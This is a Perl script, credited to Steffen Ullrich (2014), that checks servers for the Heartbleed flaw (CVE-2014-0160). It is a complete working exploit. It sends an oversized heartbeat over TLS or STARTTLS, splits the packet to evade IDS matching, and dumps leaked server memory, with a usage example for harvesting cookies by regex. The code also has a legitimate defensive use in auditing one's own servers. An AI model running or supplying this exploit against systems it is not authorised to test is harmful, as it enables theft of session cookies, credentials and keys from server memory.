#!/usr/bin/perl
# Copyright: Steffen Ullrich 2014
# feel free to use, copy, modify without restrictions - NO WARRANTY

use strict;
use warnings;
use Getopt::Long qw(:config posix_default bundling);

# try to use IPv6
my $INETCLASS;
BEGIN {
    my @mod = qw(IO::Socket::IP IO::Socket::INET6 IO::Socket::INET);
    while ($INETCLASS = shift @mod) {
	last if eval "require $INETCLASS";
	die "failed to load $INETCLASS: $@" if ! @mod;
    }
}

my $starttls = sub {1};
my $starttls_arg;
my $timeout = 5;
my $quiet = 0;
my $show = 0;
my $show_ascii = 0;
my $ssl_version = 'tlsv1';
my @show_regex;
my $heartbeats = 1;
my %starttls = (
    'smtp' => [ 25, \&smtp_starttls ],
    'http_proxy' => [ 8000, \&http_connect ],
    'http_upgrade' => [ 80, \&http_upgrade ],
    'imap' => [ 143, \&imap_starttls ],
    'pop'  => [ 110, \&pop_stls ],
    'ftp'  => [ 21, \&ftp_auth ],
);

sub usage {
    print STDERR "ERROR: @_\n" if @_;
    print STDERR <<USAGE;

Check if server is vulnerable against heartbleed SSL attack (CVE-2014-0160)
Features:
- can start with plain and upgrade with STARTTLS or similar commands with
  IMAP, POP, SMTP, FTP, HTTP and HTTP proxies
- heartbeat request is sent in two packets to circumvent simple packet
  matching IDS or packet filters
- handshake is done with TLS1.0 for better compatibility, heartbeat uses
  SSL version from server
- can use regular expressions to directly extract information from
  vulnerable sites
- can use IPv6

Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
  -h|--help              - this screen
  --starttls proto[:arg] - start plain and upgrade to SSL with starttls protocol
                           (imap,smtp,http_upgrade,http_connect,pop,ftp)
  -q|--quiet             - don't show anything, exit 1 if vulnerable
  -s|--show-data [L]     - show heartbeat response if vulnerable, optional 
                           parameter L specifies number of bytes per line (16)
  -a|--show-ascii [L]    - show heartbeat response ascii only if vulnerable, optional 
                           parameter L specifies number of bytes per line (80)
  -R|--show-regex-data R - show data matching perl regex R. Option can be
                           used multiple times
  --ssl_version V        - specify SSL version to use, e.g. ssl3, tlsv1(default), 
                           tlsv1_1, tlsv1_2
  -H|--heartbeats N      - number of heartbeats (default 1)
  -T|--timeout T         - use timeout (default 5)

Examples:
  # check direct www, imaps .. server
  $0 www.google.com:443
  $0 www.google.com:https
  $0 mail.google.com:imaps

  # try to get Cookies 
  $0 -R 'Cookie:.*' www.broken-site.com:443

  # check webserver via proxy
  $0 --starttls http_connect:www.google.com:443 proxy:8000

  # check webserver with http upgrade
  $0 --starttls http_upgrade 127.0.0.1:631

  # check imap server, start with plain and upgrade
  $0 --starttls imap imap.gmx.net:143

  # check pop server, start with plain and upgrade
  $0 --starttls pop pop.gmx.net:110

  # check smtp server, start with plain and upgrade
  $0 --starttls smtp smtp.gmail.com:587


USAGE
    exit(2);
}

my $default_port = 443;
GetOptions(
    'h|help' => sub { usage() },
    'T|timeout=i' => \$timeout,
    's|show-data:i' => sub { $show = $_[1] || 16 },
    'a|show-ascii:i' => sub { $show_ascii = $_[1] || 80 },
    'R|show-regex-match:s' => \@show_regex,
    'q|quiet' => \$quiet,
    'H|heartbeats=i' => \$heartbeats,
    'starttls=s' => sub {
	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
	my $st = $proto && $starttls{$proto};
	usage("invalid starttls protocol $_[1]") if ! $st;
	($default_port,$starttls) = @$st;
    },
    'ssl_version=s' => \$ssl_version,
);

$ssl_version = 
    lc($ssl_version) eq 'ssl3' ? 0x0300 :
    $ssl_version =~ m{^tlsv?1(?:_([12]))?}i ? 0x0301 + ($1||0) :
    die "invalid SSL version: $ssl_version";

my $show_regex;
if (@show_regex) {
    my @rx;
    push @rx, eval { qr{$_} } || die "invalid perl regex '$_'"
	for(@show_regex);
    $show_regex = join('|',@rx);
    $show_regex = eval { qr{$show_regex} } || die "invalid regex: $show_regex";
}

my $dst = shift(@ARGV) or usage("no destination given");
$dst .= ":$default_port" if $dst !~ m{^([^:]+|.+\]):\w+$};
my $cl = $INETCLASS->new(PeerAddr => $dst, Timeout => $timeout)
    or die "failed to connect: $!";

# disable NAGLE to send heartbeat with multiple small packets
setsockopt($cl,6,1,pack("l",1));

# skip plaintext before starting SSL handshake
$starttls->($cl,$dst);

# built and send ssl client hello
my $hello_data = pack("nNn14Cn/a*C/a*n/a*",
    $ssl_version,
    time(),
    ( map { rand(0x10000) } (1..14)),
    0, # session-id length
    pack("H*",'c009c00ac013c01400320038002f00350013000a000500ff'), # ciphers
    "\0", # compression null
    '',   # no extensions
);
$hello_data = substr(pack("N/a*",$hello_data),1); # 3byte length
print $cl pack(
    "Cnn/a*",0x16,$ssl_version,  # type handshake, version, length
    pack("Ca*",1,$hello_data),   # type client hello, data
);

my $use_version;
my $err;
while (1) {
    my ($type,$ver,@msg) = _readframe($cl,\$err) or die "no reply ($err)";
    if ( $type == 22 and grep { $_->[0] == 0x0e } @msg ) {
	# server hello done
	$use_version = $ver;
	last;
    }
}
# heartbeat request with wrong size
# send in two packets to work around stupid IDS which try
# to detect attack by matching packets only
my $hb = pack("Cnn/a*",0x18,$use_version,
    pack("Cn",1,0x4000));

for (1..$heartbeats) {
    verbose("...send heartbeat#$_");
    print $cl substr($hb,0,1);
    print $cl substr($hb,1);
}

if ( my ($type,$ver,$buf) = _readframe($cl,\$err)) {
    if ( $type == 21 ) {
	verbose("received alert (probably not vulnerable)");
    } elsif ( $type != 24 ) {
	verbose("unexpected reply type $type");
    } elsif ( length($buf)>3 ) {
	verbose("BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)");
	show_data($buf,$show) if $show;
	show_ascii($buf,$show_ascii) if $show_ascii;
	if ( $show_regex ) {
	    while ( $buf =~m{($show_regex)}g ) {
		print STDERR $1."\n";
	    }
	}
	exit 1;
    } else {
	verbose("GOOD proper heartbeat reply (not vulnerable)");
    }
} else {
    verbose("no reply($err) - probably not vulnerable");
}

sub _readframe {
    my ($cl,$rerr) = @_;
    my $len = 5;
    my $buf = '';
    vec( my $rin = '',fileno($cl),1 ) = 1;
    while ( length($buf)<$len ) {
	if ( ! select( my $rout = $rin,undef,undef,$timeout )) {
	    $$rerr = 'timeout';
	    return;
	};
	if ( ! sysread($cl,$buf,$len-length($buf),length($buf))) {
	    $$rerr = "eof";
	    $$rerr .= " after ".length($buf)." bytes" if $buf ne '';
	    return;
	}
	$len = unpack("x3n",$buf) + 5 if length($buf) == 5;
    }
    (my $type, my $ver,$buf) = unpack("Cnn/a*",$buf);
    my @msg;
    if ( $type == 22 ) {
	while ( length($buf)>=4 ) {
	    my ($ht,$len) = unpack("Ca3",substr($buf,0,4,''));
	    $len = unpack("N","\0$len");
	    push @msg,[ $ht,substr($buf,0,$len,'') ];
	    verbose("...ssl received type=%d ver=0x%x ht=0x%x size=%d",
		$type,$ver,$ht,length($msg[-1][1]));
	}
    } else {
	@msg = $buf;
	verbose("...ssl received type=%d ver=%x size=%d",
	    $type,$ver,length($buf));
    }

    return ($type,$ver,@msg);
}

sub smtp_starttls {
    my $cl = shift;
    my $last_status_line = qr/((\d)\d\d(?:\s.*)?)/;
    my ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server denies access: $line\n";
    print $cl "EHLO example.com\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server did not accept EHLO: $line\n";
    print $cl "STARTTLS\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server did not accept STARTTLS: $line\n";
    verbose("...reply to starttls: $line");
    return 1;
}

sub imap_starttls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "abc STARTTLS\r\n";
    while (<$cl>) {
	m{^abc (OK)?} or next;
	$1 or die "STARTTLS failed: $_";
	s{\r?\n$}{};
	verbose("...starttls: $_");
	return 1;
    }
    die "starttls failed";
}

sub pop_stls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "STLS\r\n";
    my $reply = <$cl>;
    die "STLS failed: $reply" if $reply !~m{^\+OK};
    $reply =~s{\r?\n}{};
    verbose("...stls $reply");
    return 1;
}

sub http_connect {
    my $cl = shift;
    $starttls_arg or die "no target host:port given";
    print $cl "CONNECT $starttls_arg HTTP/1.0\r\n\r\n";
    my $hdr = _readlines($cl,qr/\r?\n/);
    $hdr =~m{\A(HTTP/1\.[01]\s+(\d\d\d)[^\r\n]*)};
    die "CONNECT failed: $1" if $2 != 200;
    verbose("...connect request: $1");
    return 1;
}

sub http_upgrade {
    my ($cl,$dst) = @_;
    print $cl "OPTIONS * HTTP/1.1\r\n".
	"Host: ".($dst =~m{^(.*):\w+$} && $1)."\r\n".
	"Upgrade: TLS/1.0\r\n".
	"Connection: Upgrade\r\n".
	"\r\n";
    my $hdr = _readlines($cl,qr/\r?\n/);
    $hdr =~m{\A(HTTP/1\.[01]\s+(\d\d\d)[^\r\n]*)};
    die "upgrade not accepted, code=$2 (expect 101): $1" if $2 != 101;
    verbose("...tls upgrade request: $1");
    return 1;
}

sub ftp_auth {
    my $cl = shift;
    my $last_status_line = qr/((\d)\d\d(?:\s.*)?)/;
    my ($line,$code) = _readlines($cl,$last_status_line);
    die "server denies access: $line\n" if $code != 2;
    print $cl "AUTH TLS\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    die "AUTH TLS denied: $line\n" if $code != 2;
    verbose("...ftp auth: $line");
    return 1;
}

sub verbose {
    return if $quiet;
    my $msg = shift;
    $msg = sprintf($msg,@_) if @_;
    print STDERR $msg,"\n";
}

sub show_data {
    my ($data,$len) = @_;
    my $lastd = '';
    my $repeat = 0;
    while ( $data ne '' ) {
	my $d = substr($data,0,$len,'' );
	$repeat++,next if $d eq $lastd;
	$lastd = $d;
	if ( $repeat ) {
	    print STDERR "... repeated $repeat times ...\n";
	    $repeat = 0;
	}
	( my $h = unpack("H*",$d)) =~s{(..)}{$1 }g;
	( my $c = $d ) =~s{[\x00-\x20\x7f-\xff]}{.}g;
	my $hl = $len*3;
	printf STDERR "%-${hl}s  %-${len}s\n",$h,$c;
    }
    print STDERR "... repeated $repeat times ...\n" if $repeat;
}

sub show_ascii {
    my ($data,$len) = @_;
    my $lastd = '';
    my $repeat = 0;
    while ( $data ne '' ) {
	my $d = substr($data,0,$len,'' );
	$repeat++,next if $d eq $lastd;
	$lastd = $d;
	if ( $repeat ) {
	    print STDERR "... repeated $repeat times ...\n";
	    $repeat = 0;
	}
	( my $c = $d ) =~s{[\x00-\x20\x7f-\xff]}{.}g;
	printf STDERR "%-${len}s\n",$c;
    }
    print STDERR "... repeated $repeat times ...\n" if $repeat;
}

sub _readlines {
    my ($cl,$stoprx) = @_;
    my $buf = '';
    while (<$cl>) { 
	$buf .= $_;
	return $buf if ! $stoprx;
	next if ! m{\A$stoprx\Z};
	return ( m{\A$stoprx\Z},$buf );
    }
    die "eof" if $buf eq '';
    die "unexpected response: $buf";
}
